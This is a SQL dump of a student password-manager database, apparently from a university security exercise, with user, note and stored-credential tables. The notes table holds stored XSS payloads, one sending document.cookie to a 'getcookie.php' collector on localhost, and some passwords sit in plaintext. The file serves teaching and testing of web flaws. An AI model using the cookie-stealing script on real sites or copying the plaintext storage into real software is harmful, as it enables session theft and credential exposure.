-- Ονοματεπώνυμο : Γεώργιος Τσαντίκης
-- ΑΕΜ : 10722
-- Email : tsangeor@ece.auth.gr


-- --------------------------------------------------------
-- Host:                         127.0.0.1
-- Server version:               10.4.32-MariaDB - mariadb.org binary distribution
-- Server OS:                    Win64
-- HeidiSQL Version:             12.13.0.7147
-- --------------------------------------------------------

/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET NAMES utf8 */;
/*!50503 SET NAMES utf8mb4 */;
/*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */;
/*!40103 SET TIME_ZONE='+00:00' */;
/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;
/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;
/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;

-- Dumping structure for table pwd_mgr.dummy
CREATE TABLE IF NOT EXISTS `dummy` (
  `id` int(11) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1 COLLATE=latin1_swedish_ci;

-- Dumping data for table pwd_mgr.dummy: ~0 rows (approximately)

-- Dumping structure for table pwd_mgr.login_users
CREATE TABLE IF NOT EXISTS `login_users` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `username` varchar(20) NOT NULL,
  `password` varchar(256) NOT NULL DEFAULT '',
  `salt` varchar(64) NOT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `user` (`username`)
) ENGINE=InnoDB AUTO_INCREMENT=6 DEFAULT CHARSET=latin1 COLLATE=latin1_swedish_ci;

-- Dumping data for table pwd_mgr.login_users: ~3 rows (approximately)
INSERT INTO `login_users` (`id`, `username`, `password`, `salt`) VALUES
	(1, 'u1', 'p1', ''),
	(4, 'user2', 'pass2', ''),
	(5, 'secure_user', '49620bd39a8f47244b833279c60391fc4696cce0d59df5a6d24833c0e8f81aeb', '5cfcab748f11ebae1d080d4259f25ae1434c837a06758f656b98194e83710e91');

-- Dumping structure for table pwd_mgr.notes
CREATE TABLE IF NOT EXISTS `notes` (
  `notesid` int(11) NOT NULL AUTO_INCREMENT,
  `login_user_id` int(11) DEFAULT NULL,
  `note` varchar(300) NOT NULL,
  PRIMARY KEY (`notesid`) USING BTREE,
  KEY `FK_notes-login_users` (`login_user_id`) USING BTREE,
  CONSTRAINT `FK_notes-login_users` FOREIGN KEY (`login_user_id`) REFERENCES `login_users` (`id`) ON DELETE CASCADE ON UPDATE CASCADE
) ENGINE=InnoDB AUTO_INCREMENT=30 DEFAULT CHARSET=latin1 COLLATE=latin1_swedish_ci;

-- Dumping data for table pwd_mgr.notes: ~3 rows (approximately)
INSERT INTO `notes` (`notesid`, `login_user_id`, `note`) VALUES
	(1, 1, 'test1'),
	(28, 1, '<script>window.location.href="http://localhost/passman/xss/getcookie.php?v="+document.cookie;</script>'),
	(29, 5, '<script>alert("XSS");</script>');

-- Dumping structure for table pwd_mgr.websites
CREATE TABLE IF NOT EXISTS `websites` (
  `webid` int(11) NOT NULL AUTO_INCREMENT,
  `login_user_id` int(11) DEFAULT NULL,
  `web_url` varchar(250) NOT NULL,
  `web_username` varchar(20) NOT NULL DEFAULT '',
  `web_password` varchar(300) NOT NULL DEFAULT '',
  PRIMARY KEY (`webid`) USING BTREE,
  KEY `FK_websites-login_users` (`login_user_id`),
  CONSTRAINT `FK_websites-login_users` FOREIGN KEY (`login_user_id`) REFERENCES `login_users` (`id`) ON DELETE CASCADE ON UPDATE CASCADE
) ENGINE=InnoDB AUTO_INCREMENT=17 DEFAULT CHARSET=latin1 COLLATE=latin1_swedish_ci;

-- Dumping data for table pwd_mgr.websites: ~2 rows (approximately)
INSERT INTO `websites` (`webid`, `login_user_id`, `web_url`, `web_username`, `web_password`) VALUES
	(1, 1, 'www.test.com', 'tom', 'tompass'),
	(16, 5, 'www.bank.com', 'mybank', '2Aeo1vX2T2cJ3z54qG3e+RUE2jKz3ZwFl42bxAzvj4AqX5QP4w==');

/*!40103 SET TIME_ZONE=IFNULL(@OLD_TIME_ZONE, 'system') */;
/*!40101 SET SQL_MODE=IFNULL(@OLD_SQL_MODE, '') */;
/*!40014 SET FOREIGN_KEY_CHECKS=IFNULL(@OLD_FOREIGN_KEY_CHECKS, 1) */;
/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40111 SET SQL_NOTES=IFNULL(@OLD_SQL_NOTES, 1) */;
